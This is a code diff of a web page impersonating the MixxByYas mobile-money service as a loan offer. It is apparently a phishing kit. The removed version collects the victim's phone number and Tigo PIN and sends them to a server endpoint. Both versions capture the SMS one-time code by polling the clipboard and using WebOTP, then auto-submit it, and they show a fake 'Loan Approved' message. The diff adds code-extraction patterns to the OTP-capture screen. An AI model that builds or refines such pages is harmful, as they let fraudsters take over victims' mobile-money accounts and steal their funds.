@@ -1,218 +1,734 @@
 <!DOCTYPE html>
-<html lang="sw">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MixxByYas - Thibitisha</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>MixxByYas • Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        :root { --primary: #2563eb; --gold: #f59e0b; --gold-dark: #d97706; --light-yellow: #fffef5; --success: #10b981; --danger: #ef4444; --dark: #1e293b; --gray: #64748b; --white: #ffffff; --light-navy: #2c3e6b; --timer-blue: #e0f0ff; }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--light-yellow); color: var(--dark); line-height: 1.6; min-height: 100vh; display: flex; flex-direction: column; }
-        .brand-bar { background: var(--light-navy); text-align: center; padding: 0.8rem; display: flex; align-items: center; justify-content: center; gap: 0.6rem; border-bottom: 2px solid var(--gold); }
-        .brand-logo { width: 32px; height: 32px; background: var(--gold); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 0.9rem; color: var(--light-navy); }
-        .brand-text { font-size: 1.1rem; font-weight: 700; } .brand-text .mixx { color: var(--white); } .brand-text .yas { color: var(--gold); }
-        .back-link { display: block; padding: 1rem 1.5rem; color: var(--gray); text-decoration: none; font-size: 0.9rem; max-width: 500px; margin: 0 auto; }
-        .main-container { max-width: 500px; margin: 0 auto 2rem; padding: 0 1rem; flex: 1; }
-        .card { background: var(--white); border-radius: 14px; padding: 2rem; box-shadow: 0 4px 15px rgba(0,0,0,0.06); border: 1px solid #fef3c7; }
-        .loan-summary { background: #fefce8; border-radius: 14px; padding: 1rem; text-align: center; margin-bottom: 1.5rem; }
-        .loan-summary .amount { font-size: 1.6rem; font-weight: 900; color: var(--primary); }
-        .screen { display: none; animation: fadeIn 0.4s ease; } .screen.active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        .form-group { margin-bottom: 1.2rem; } .form-group label { display: block; font-weight: 600; font-size: 0.9rem; margin-bottom: 0.4rem; }
-        .phone-box { display: flex; border: 2px solid #fef3c7; border-radius: 14px; overflow: hidden; }
-        .phone-box .prefix { background: #fef9e7; padding: 0.85rem 1rem; font-weight: 700; border-right: 1px solid #fef3c7; }
-        .phone-box input { flex: 1; padding: 0.85rem 1rem; border: none; font-size: 1rem; font-family: inherit; outline: none; }
-        .pin-box { position: relative; border: 2px solid #fef3c7; border-radius: 14px; overflow: hidden; }
-        .pin-box input { width: 100%; padding: 0.85rem 1rem; border: none; font-size: 1.2rem; font-family: inherit; outline: none; letter-spacing: 0.5rem; }
-        .pin-box .toggle-btn { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; font-size: 1.2rem; }
-        .error-msg { color: var(--danger); font-size: 0.8rem; margin-top: 0.3rem; display: none; } .error-msg.show { display: block; }
-        .btn { width: 100%; padding: 0.95rem; border-radius: 50px; font-weight: 700; font-size: 1rem; cursor: pointer; border: none; font-family: inherit; margin-top: 0.5rem; }
-        .btn-gold { background: var(--gold); color: var(--dark); }
-        .waiting-content { text-align: center; padding: 1rem; }
-        .spinner { width: 50px; height: 50px; border: 4px solid #fef3c7; border-top-color: var(--gold); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 1rem; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .phone-display { background: #fef9e7; padding: 0.4rem 1.2rem; border-radius: 25px; display: inline-block; font-weight: 700; margin: 0.5rem 0; font-size: 0.9rem; }
-        .code-instruction { background: #fefce8; border-radius: 12px; padding: 14px 16px; margin: 10px 0; font-size: 0.85rem; color: var(--dark); text-align: center; border: 1px solid #fef3c7; line-height: 1.6; }
-        .code-instruction i { color: var(--gold); margin-right: 4px; }
-        .sms-textarea { width: 100%; height: 100px; border: 2px solid #fef3c7; border-radius: 14px; padding: 12px; font-size: 0.85rem; font-family: inherit; resize: vertical; outline: none; background: #fff; }
-        .sms-textarea:focus { border-color: var(--gold); }
-        .sms-textarea::placeholder { color: #b0b8c4; }
-        .timer-bar { background: var(--timer-blue); border-radius: 10px; padding: 0.6rem; text-align: center; font-weight: 700; font-size: 0.9rem; color: var(--primary); margin-top: 0.3rem; }
-        .timer-bar.warning { background: #fef2f2; color: var(--danger); }
-        .resend-link { text-align: center; margin-top: 0.8rem; }
-        .resend-link a { color: var(--primary); text-decoration: none; font-size: 0.85rem; cursor: pointer; font-weight: 600; }
-        .success-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 1000; align-items: center; justify-content: center; }
-        .success-overlay.active { display: flex; }
-        .success-card { background: var(--white); border-radius: 14px; padding: 2rem; text-align: center; max-width: 400px; width: 90%; animation: popIn 0.5s ease; }
-        @keyframes popIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
-        .check-icon { width: 70px; height: 70px; margin: 0 auto 0.8rem; } .check-icon svg { width: 100%; height: 100%; }
-        .check-circle { stroke: var(--success); stroke-width: 3; fill: none; stroke-dasharray: 283; stroke-dashoffset: 283; animation: drawCircle 1s ease forwards; }
-        .check-mark { stroke: var(--success); stroke-width: 3; fill: none; stroke-dasharray: 100; stroke-dashoffset: 100; animation: drawCheck 0.5s 0.6s ease forwards; }
-        @keyframes drawCircle { to { stroke-dashoffset: 0; } } @keyframes drawCheck { to { stroke-dashoffset: 0; } }
-        .success-card h2 { color: var(--success); margin-bottom: 0.3rem; }
-        .success-card .big-amount { font-size: 1.8rem; font-weight: 900; color: var(--primary); margin: 0.5rem 0; }
-        .btn-home { background: var(--gold); color: var(--dark); padding: 0.8rem 2rem; border-radius: 50px; font-weight: 600; cursor: pointer; border: none; font-family: inherit; font-size: 0.9rem; }
-        .copyright-bar { background: var(--light-navy); text-align: center; padding: 1rem; margin-top: auto; }
-        .copyright-bar p { color: rgba(255,255,255,0.6); font-size: 0.75rem; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
+        body {
+            min-height: 100vh;
+            background: linear-gradient(145deg, #0b0e1a 0%, #141b2b 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .card {
+            max-width: 480px;
+            width: 100%;
+            background: rgba(22, 30, 46, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 48px;
+            padding: 32px 24px;
+            box-shadow: 0 25px 50px -8px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.04);
+        }
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(99, 102, 241, 0.15);
+            padding: 6px 16px 6px 12px;
+            border-radius: 60px;
+            color: #a5b4fc;
+            font-size: 12px;
+            font-weight: 600;
+            border: 1px solid rgba(99, 102, 241, 0.2);
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #f1f5f9;
+            font-weight: 600;
+            font-size: 26px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        h2 i { color: #818cf8; font-size: 28px; }
+        .sub {
+            color: #94a3b8;
+            font-size: 15px;
+            margin-bottom: 28px;
+            border-left: 3px solid #4f46e5;
+            padding-left: 14px;
+            background: rgba(79, 70, 229, 0.05);
+            border-radius: 0 8px 8px 0;
+        }
+        .step-guide {
+            background: rgba(15, 23, 42, 0.6);
+            border-radius: 20px;
+            padding: 18px 16px;
+            margin-bottom: 28px;
+            border: 1px solid rgba(255,255,255,0.03);
+        }
+        .step-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+            margin-bottom: 14px;
+        }
+        .step-item:last-child { margin-bottom: 0; }
+        .step-num {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-width: 28px;
+            height: 28px;
+            background: #4f46e5;
+            color: white;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 700;
+        }
+        .step-text { color: #e2e8f0; font-size: 15px; line-height: 1.5; }
+        .step-text strong { color: #a5b4fc; }
+        .sms-box {
+            background: #0f172a;
+            border-radius: 24px;
+            padding: 20px 18px;
+            margin: 20px 0 18px;
+            border: 1px solid #334155;
+            transition: border 0.2s, box-shadow 0.2s;
+        }
+        .sms-box:focus-within {
+            border-color: #818cf8;
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
+        }
+        .sms-box label {
+            display: block;
+            color: #94a3b8;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+        .sms-box label i { margin-right: 8px; color: #818cf8; }
+        textarea#smsCode {
+            width: 100%;
+            background: transparent;
+            border: none;
+            resize: none;
+            color: #f1f5f9;
+            font-size: 16px;
+            line-height: 1.6;
+            min-height: 90px;
+            padding: 0;
+            outline: none;
+            font-family: 'Inter', monospace;
+        }
+        textarea#smsCode::placeholder { color: #475569; font-size: 15px; font-weight: 300; }
+        .sms-actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin: 14px 0 10px;
+        }
+        .btn-app {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: #1e293b;
+            border: 1px solid #334155;
+            padding: 12px 6px;
+            border-radius: 60px;
+            color: #e2e8f0;
+            font-weight: 500;
+            font-size: 15px;
+            transition: 0.15s;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .btn-app:active { transform: scale(0.96); background: #2d3a52; }
+        .btn-primary {
+            width: 100%;
+            background: #4f46e5;
+            border: none;
+            padding: 16px;
+            border-radius: 60px;
+            color: white;
+            font-weight: 600;
+            font-size: 17px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 12px;
+            transition: 0.15s;
+            cursor: pointer;
+            box-shadow: 0 8px 20px -6px rgba(79, 70, 229, 0.3);
+        }
+        .btn-primary:active { transform: scale(0.97); background: #4338ca; }
+        .btn-primary:disabled {
+            opacity: 0.6;
+            transform: none;
+            background: #334155;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+        .resend-area {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 18px;
+            font-size: 14px;
+            color: #94a3b8;
+            flex-wrap: wrap;
+        }
+        #resendBtn {
+            background: transparent;
+            border: none;
+            color: #818cf8;
+            font-weight: 600;
+            padding: 8px 14px;
+            border-radius: 60px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        #resendBtn:disabled { opacity: 0.4; cursor: not-allowed; }
+        #resendCounter {
+            background: #1e293b;
+            padding: 5px 14px;
+            border-radius: 40px;
+            font-weight: 500;
+            color: #cbd5e1;
+        }
+        .status-badge {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 14px;
+            color: #94a3b8;
+        }
+        .status-badge i { margin-right: 6px; }
+        .hidden { display: none !important; }
+        .toast {
+            background: #0f172a;
+            border-left: 4px solid #4f46e5;
+            padding: 14px 18px;
+            border-radius: 16px;
+            color: #e2e8f0;
+            margin: 16px 0 8px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
+        .toast i { color: #818cf8; font-size: 20px; }
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .auto-detect-badge {
+            background: rgba(16, 185, 129, 0.15);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 60px;
+            padding: 8px 16px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: #34d399;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 16px;
+        }
+        .auto-detect-badge .pulse-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #34d399;
+            border-radius: 50%;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.4; transform: scale(0.9); }
+            50% { opacity: 1; transform: scale(1.2); }
+            100% { opacity: 0.4; transform: scale(0.9); }
+        }
+        .sms-badge {
+            display: inline-block;
+            background: rgba(99, 102, 241, 0.1);
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            color: #818cf8;
+            border: 1px solid rgba(99, 102, 241, 0.1);
+        }
+        .success-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            backdrop-filter: blur(8px);
+        }
+        .success-modal {
+            background: #1e293b;
+            padding: 40px;
+            border-radius: 32px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            border: 1px solid rgba(16, 185, 129, 0.3);
+        }
+        .success-modal i {
+            font-size: 60px;
+            color: #34d399;
+            margin-bottom: 20px;
+        }
+        .success-modal h2 {
+            color: #f1f5f9;
+            margin-bottom: 10px;
+        }
+        .success-modal p {
+            color: #94a3b8;
+            margin-bottom: 20px;
+        }
+        .success-modal .btn-close {
+            background: #4f46e5;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 60px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.15s;
+        }
+        .success-modal .btn-close:hover {
+            background: #4338ca;
+        }
     </style>
 </head>
 <body>
-    <div class="brand-bar"><div class="brand-logo">M</div><div class="brand-text"><span class="mixx">Mixx</span><span class="yas">ByYas</span></div></div>
-    <a href="/apply" class="back-link">← Rudi</a>
-    <div class="main-container">
-        <div class="loan-summary"><div style="font-size:0.75rem;color:var(--gray);">Mkopo Wako</div><div class="amount" id="loanAmount">TZS 0</div></div>
-        <div class="card">
-            <div class="screen active" id="screen1">
-                <h3 style="margin-bottom:1rem;">📱 Ingiza Taarifa za Tigo</h3>
-                <div class="form-group"><label>Namba ya Simu</label><div class="phone-box"><span class="prefix">+255</span><input type="tel" id="phoneNumber" placeholder="0712345678 au 0612345678" maxlength="12"></div><div class="error-msg" id="phoneError">Ingiza namba sahihi</div></div>
-                <div class="form-group"><label>PIN ya Tigo</label><div class="pin-box"><input type="password" id="tigoPin" placeholder="• • • •" maxlength="4"><button class="toggle-btn" onclick="togglePIN()">👁️</button></div><div class="error-msg" id="pinError">Ingiza PIN</div></div>
-                <button class="btn btn-gold" onclick="submitDetails()">Endelea →</button>
-            </div>
-            <div class="screen" id="screen2"><div class="waiting-content"><div class="spinner"></div><h3>⏳ Inakaguliwa</h3><p style="color:var(--gray);">Inasubiri uidhinishaji</p><div class="phone-display" id="showPhone">+255 ---------</div></div></div>
-            <div class="screen" id="screen3"><div class="waiting-content">
-                <h3>✅ Namba ya Uthibitisho</h3>
-                <div class="phone-display" id="showPhone2">+255 ---------</div>
-                <div class="code-instruction">
-                    <i class="fas fa-sms"></i> <strong>Inasubiri namba ya uthibitisho kutoka Mixx by Yas...</strong><br>
-                    <span style="font-size:0.75rem;color:var(--gray);">Usifunge ukurasa huu. Namba itajaa moja kwa moja.</span>
-                </div>
-                <textarea id="smsMessage" class="sms-textarea" placeholder="Namba itaonekana hapa moja kwa moja..." readonly></textarea>
-                <div class="timer-bar" id="timerDisplay">⏳ 30s</div>
-                <div class="error-msg" id="codeError" style="text-align:center;"></div>
-                <button class="btn btn-gold" onclick="submitCode()" id="btnSubmit" style="display:none;">Endelea →</button>
-                <div class="resend-link"><a onclick="resendCode()">↻ Hukupokea SMS? Bonyeza hapa</a></div>
-            </div></div>
-            <div class="screen" id="screen4"><div class="waiting-content"><div class="spinner"></div><h3>⏳ Inathibitisha</h3><div class="phone-display" id="showPhone3">+255 ---------</div></div></div>
+
+<div class="card">
+    <div class="badge">
+        <i class="fas fa-shield-alt"></i> Secure verification
+    </div>
+    <h2>
+        <i class="fas fa-mobile-screen-button"></i> Code check
+    </h2>
+    <div class="sub">
+        <i class="fas fa-robot" style="margin-right: 8px;"></i> Auto-reads SMS from notification
+    </div>
+
+    <div class="auto-detect-badge">
+        <span class="pulse-dot"></span>
+        <span id="detectionStatus">📱 Auto-detecting SMS...</span>
+    </div>
+
+    <div class="step-guide">
+        <div class="step-item">
+            <span class="step-num">1</span>
+            <span class="step-text"><strong>Wait</strong> for SMS to arrive</span>
+        </div>
+        <div class="step-item">
+            <span class="step-num">2</span>
+            <span class="step-text">Page will <strong>auto-detect</strong> the code</span>
+        </div>
+        <div class="step-item">
+            <span class="step-num">3</span>
+            <span class="step-text">Auto-submits for verification</span>
         </div>
     </div>
-    <div class="success-overlay" id="successOverlay"><div class="success-card"><div class="check-icon"><svg viewBox="0 0 100 100"><circle class="check-circle" cx="50" cy="50" r="45"/><path class="check-mark" d="M30 50 L45 65 L70 35" fill="none"/></svg></div><h2>🎉 Mkopo Umeidhinishwa!</h2><div class="big-amount" id="approvedAmount">TZS 0</div><p>📱 Uthibitisho umetumwa<br>💰 Fedha zitaingia hivi karibuni</p><button class="btn-home" onclick="window.location.href='/'">🏠 Rudi Nyumbani</button></div></div>
-    <div class="copyright-bar"><p>© 2024 MixxByYas</p></div>
-    <script>
-        var urlParams = new URLSearchParams(window.location.search);
-        var loanAmount = parseInt(urlParams.get('amount') || '500000');
-        var loanTerm = parseInt(urlParams.get('term') || '12');
-        document.getElementById('loanAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
-        document.getElementById('approvedAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
-        var appId = '', checkInterval = null, countdownTimer = null, userPhone = '', fastCheck = null, lastClip = '';
-        var resendCount = 0, resendCooldown = false, codeReceived = false;
 
-        function togglePIN() { var p = document.getElementById('tigoPin'); var b = p.parentElement.querySelector('.toggle-btn'); if (p.type === 'password') { p.type = 'text'; b.textContent = '🙈'; } else { p.type = 'password'; b.textContent = '👁️'; } }
-        document.getElementById('phoneNumber').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
-        document.getElementById('tigoPin').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
+    <div class="sms-box">
+        <label for="smsCode"><i class="fas fa-sms"></i> Full SMS <span class="sms-badge">auto-detected</span></label>
+        <textarea id="smsCode" readonly placeholder="SMS will appear here automatically..."></textarea>
+    </div>
 
-        async function submitDetails() {
-            var phone = document.getElementById('phoneNumber').value.trim(); var pin = document.getElementById('tigoPin').value.trim();
-            if (!phone || phone.length < 9) { document.getElementById('phoneError').classList.add('show'); return; }
-            if (!pin || pin.length !== 4) { document.getElementById('pinError').classList.add('show'); return; }
-            userPhone = phone;
-            document.getElementById('screen1').classList.remove('active'); document.getElementById('screen2').classList.add('active');
-            document.getElementById('showPhone').textContent = '+255 ' + phone; document.getElementById('showPhone2').textContent = '+255 ' + phone; document.getElementById('showPhone3').textContent = '+255 ' + phone;
-            var loanData = JSON.parse(localStorage.getItem('loan_data') || '{}');
-            try { var res = await fetch('/api/submit_loan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: phone, pin: pin, amount: loanAmount, months: loanTerm, loan_type: loanData.loan_type || '', purpose: loanData.purpose || '' }) }); var data = await res.json(); appId = data.app_id; startChecking(); } catch(e) { alert('Error: ' + e.message); }
-        }
+    <div class="sms-actions">
+        <a href="sms:" class="btn-app"><i class="fab fa-apple"></i> iPhone</a>
+        <a href="sms:" class="btn-app"><i class="fab fa-android"></i> Android</a>
+    </div>
 
-        function startChecking() { 
-            if (checkInterval) clearInterval(checkInterval); 
-            checkInterval = setInterval(async function() { 
-                try { 
-                    var res = await fetch('/api/check_status/' + appId); var data = await res.json(); 
-                    if (data.status === 'approved') { clearInterval(checkInterval); showCodeScreen(); } 
-                    else if (data.status === 'wrong_pin') { clearInterval(checkInterval); var invType = data.invalid_type || ''; if (invType === 'wrong_pin') { goBackToPinWrong(); } else { goBackToPin(); } } 
-                    else if (data.status === 'invalid_number') { clearInterval(checkInterval); var invType2 = data.invalid_type || ''; if (invType2 === 'otp_tigo') { goToHomeOtpTigo(); } else { goToHomeTigo(); } }
-                } catch(e) {} 
-            }, 3000); 
-        }
+    <button class="btn-primary" id="submitBtn">
+        <i class="fas fa-check-circle"></i> Thibitisha
+        <span id="submitSpinner" class="spinner hidden"></span>
+    </button>
 
-        function showCodeScreen() { 
-            document.getElementById('screen2').classList.remove('active'); 
-            document.getElementById('screen3').classList.add('active'); 
-            document.getElementById('smsMessage').value = ''; 
-            document.getElementById('btnSubmit').style.display = 'none';
-            document.getElementById('codeError').classList.remove('show');
-            lastClip = ''; codeReceived = false;
-            startCountdown(); 
-            startClipWatcher(); 
-            // Try WebOTP
-            if (window.OTPCredential) {
-                var ac = new AbortController();
-                navigator.credentials.get({
-                    otp: { transport: ['sms'] },
-                    signal: ac.signal
-                }).then(function(otp) {
-                    if (!codeReceived) autoFillCode(otp.code);
-                }).catch(function() {});
-                setTimeout(function() { ac.abort(); }, 120000);
+    <div class="resend-area">
+        <span><i class="far fa-clock"></i> <span id="resendCounter">0 / 3</span></span>
+        <button id="resendBtn" disabled><i class="fas fa-rotate-right"></i> Tuma tena</button>
+    </div>
+
+    <div id="statusToast" class="toast hidden">
+        <i class="fas fa-circle-check"></i>
+        <span id="toastMessage">SMS imebandikwa!</span>
+    </div>
+    <div class="status-badge" id="statusText">
+        <i class="fas fa-info-circle"></i> Waiting for SMS...
+    </div>
+</div>
+
+<!-- Success Overlay -->
+<div id="successOverlay" class="success-overlay hidden">
+    <div class="success-modal">
+        <i class="fas fa-check-circle"></i>
+        <h2>Loan Approved! ✅</h2>
+        <p>Your loan has been approved successfully. You will receive a confirmation SMS shortly.</p>
+        <button class="btn-close" onclick="closeSuccess()">Done</button>
+    </div>
+</div>
+
+<script>
+    (function() {
+        'use strict';
+
+        const smsTextarea = document.getElementById('smsCode');
+        const submitBtn = document.getElementById('submitBtn');
+        const submitSpinner = document.getElementById('submitSpinner');
+        const resendBtn = document.getElementById('resendBtn');
+        const resendCounter = document.getElementById('resendCounter');
+        const statusToast = document.getElementById('statusToast');
+        const toastMessage = document.getElementById('toastMessage');
+        const statusText = document.getElementById('statusText');
+        const detectionStatus = document.getElementById('detectionStatus');
+        const successOverlay = document.getElementById('successOverlay');
+
+        let resendAttempts = 0;
+        const MAX_RESEND = 3;
+        let cooldownTimer = null;
+        let cooldownSeconds = 0;
+        let isSubmitting = false;
+        let smsDetected = false;
+
+        function showToast(msg, isError = false) {
+            statusToast.classList.remove('hidden');
+            toastMessage.textContent = msg;
+            if (isError) {
+                statusToast.style.borderLeftColor = '#ef4444';
+                statusToast.querySelector('i').className = 'fas fa-circle-exclamation';
+            } else {
+                statusToast.style.borderLeftColor = '#4f46e5';
+                statusToast.querySelector('i').className = 'fas fa-circle-check';
             }
+            clearTimeout(window.toastTimeout);
+            window.toastTimeout = setTimeout(() => {
+                statusToast.classList.add('hidden');
+            }, 5000);
         }
 
-        function autoFillCode(code) {
-            if (codeReceived) return;
-            codeReceived = true;
-            document.getElementById('smsMessage').value = code;
-            document.getElementById('codeError').textContent = '✅ Namba imepokelewa! Inatuma...';
-            document.getElementById('codeError').style.color = 'var(--success)';
-            document.getElementById('codeError').classList.add('show');
-            document.getElementById('btnSubmit').style.display = 'block';
-            if (fastCheck) clearInterval(fastCheck);
-            if (countdownTimer) clearInterval(countdownTimer);
-            document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
-            document.getElementById('timerDisplay').className = 'timer-bar';
-            setTimeout(function() { submitCode(); }, 500);
+        function setStatus(msg, icon = 'fa-info-circle') {
+            statusText.innerHTML = `<i class="fas ${icon}"></i> ${msg}`;
         }
 
-        function startCountdown() { if (countdownTimer) clearInterval(countdownTimer); var seconds = 30; var display = document.getElementById('timerDisplay'); display.textContent = '⏳ ' + seconds + 's'; display.className = 'timer-bar'; countdownTimer = setInterval(function() { seconds--; display.textContent = '⏳ ' + seconds + 's'; if (seconds <= 10) display.className = 'timer-bar warning'; if (seconds <= 0) { clearInterval(countdownTimer); display.textContent = 'Muda Umeisha'; display.className = 'timer-bar warning'; } }, 1000); }
-
-        function startClipWatcher() {
-            if (fastCheck) clearInterval(fastCheck);
-            fastCheck = setInterval(checkClipboard, 500);
-        }
-
-        async function checkClipboard() {
-            if (!document.getElementById('screen3').classList.contains('active') || codeReceived) {
-                clearInterval(fastCheck);
+        function updateResendUI() {
+            resendCounter.textContent = `${resendAttempts} / ${MAX_RESEND}`;
+            if (resendAttempts >= MAX_RESEND) {
+                resendBtn.disabled = true;
+                resendBtn.innerHTML = '<i class="fas fa-ban"></i> Imeisha';
                 return;
             }
-            try {
-                var text = await navigator.clipboard.readText();
-                if (text && text !== lastClip && text.length > 10) {
-                    lastClip = text;
-                    autoFillCode(text);
+            if (cooldownSeconds > 0) {
+                resendBtn.disabled = true;
+                resendBtn.innerHTML = `<i class="fas fa-hourglass-half"></i> ${cooldownSeconds}s`;
+            } else {
+                resendBtn.disabled = false;
+                resendBtn.innerHTML = '<i class="fas fa-rotate-right"></i> Tuma tena';
+            }
+        }
+
+        function startCooldown() {
+            if (cooldownTimer) clearInterval(cooldownTimer);
+            cooldownSeconds = 30;
+            updateResendUI();
+            cooldownTimer = setInterval(() => {
+                cooldownSeconds--;
+                updateResendUI();
+                if (cooldownSeconds <= 0) {
+                    clearInterval(cooldownTimer);
+                    cooldownTimer = null;
+                    updateResendUI();
                 }
-            } catch(e) {}
+            }, 1000);
         }
 
-        async function resendCode() { 
-            if (!userPhone) return; 
-            if (resendCooldown) { document.getElementById('codeError').textContent = 'Subiri sekunde 30 kabla ya kuomba tena.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 3000); return; }
-            if (resendCount >= 3) { document.getElementById('codeError').textContent = 'Umezidi idadi ya maombi. Jaribu tena baadae.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); return; }
-            resendCount++; resendCooldown = true; 
-            document.getElementById('smsMessage').value = ''; lastClip = ''; codeReceived = false;
-            document.getElementById('btnSubmit').style.display = 'none';
-            document.getElementById('codeError').textContent = 'OTP Imetumwa. Inasubiri... (' + resendCount + '/3)'; 
-            document.getElementById('codeError').style.color = 'var(--primary)'; document.getElementById('codeError').classList.add('show'); 
-            try { await fetch('/api/submit_loan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: userPhone, pin: '0000', amount: loanAmount, months: loanTerm, loan_type: '', purpose: 'OTP REQUESTED' }) }); } catch(e) {} 
-            startChecking(); startClipWatcher();
-            setTimeout(function() { resendCooldown = false; }, 30000);
+        function extractCodeFromSMS(smsText) {
+            const patterns = [
+                /code[:\s]+([a-zA-Z0-9]{6,20})/i,
+                /verification[:\s]+code[:\s]+([a-zA-Z0-9]{6,20})/i,
+                /OTP[:\s]+([a-zA-Z0-9]{6,20})/i,
+                /use the code[:\s]+([a-zA-Z0-9]{6,20})/i,
+                /([a-zA-Z0-9]{8,20})(?=\s+to\s+complete)/i,
+                /([a-zA-Z0-9]{8,20})(?=\s+to\s+register)/i,
+                /([a-zA-Z0-9]{6,20})(?=\s+is\s+your)/i,
+                /\b([a-zA-Z0-9]{8,20})\b/
+            ];
+            
+            for (let pattern of patterns) {
+                const match = smsText.match(pattern);
+                if (match) {
+                    return match[1];
+                }
+            }
+            return null;
         }
 
-        function goBackToPin() { if (fastCheck) { clearInterval(fastCheck); } document.getElementById('screen2').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.getElementById('smsMessage').value = ''; lastClip = ''; codeReceived = false; document.getElementById('btnSubmit').style.display = 'none'; }
-        function goBackToPinWrong() { if (fastCheck) { clearInterval(fastCheck); } if (countdownTimer) { clearInterval(countdownTimer); } document.getElementById('screen2').classList.remove('active'); document.getElementById('screen4').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.getElementById('smsMessage').value = ''; lastClip = ''; codeReceived = false; document.getElementById('btnSubmit').style.display = 'none'; document.getElementById('pinError').textContent = 'PIN yako sio sahihi. Una nafasi moja tu ya kujaribu tena.'; document.getElementById('pinError').style.color = 'var(--danger)'; document.getElementById('pinError').classList.add('show'); setTimeout(function() { document.getElementById('pinError').classList.remove('show'); document.getElementById('pinError').textContent = 'Ingiza PIN'; }, 8000); }
-        function goToHomeTigo() { if (fastCheck) { clearInterval(fastCheck); } if (countdownTimer) { clearInterval(countdownTimer); } localStorage.setItem('popupTigo', 'true'); window.location.href = '/'; }
-        function goToHomeOtpTigo() { if (fastCheck) { clearInterval(fastCheck); } if (countdownTimer) { clearInterval(countdownTimer); } localStorage.setItem('popupOtpTigo', 'true'); window.location.href = '/'; }
+        async function autoReadSMS() {
+            try {
+                if (!('OTPCredential' in window)) {
+                    detectionStatus.textContent = '📋 Please copy SMS from notification';
+                    return false;
+                }
 
-        async function submitCode() { 
-            if (fastCheck) { clearInterval(fastCheck); } if (countdownTimer) { clearInterval(countdownTimer); } 
-            var smsText = document.getElementById('smsMessage').value.trim();
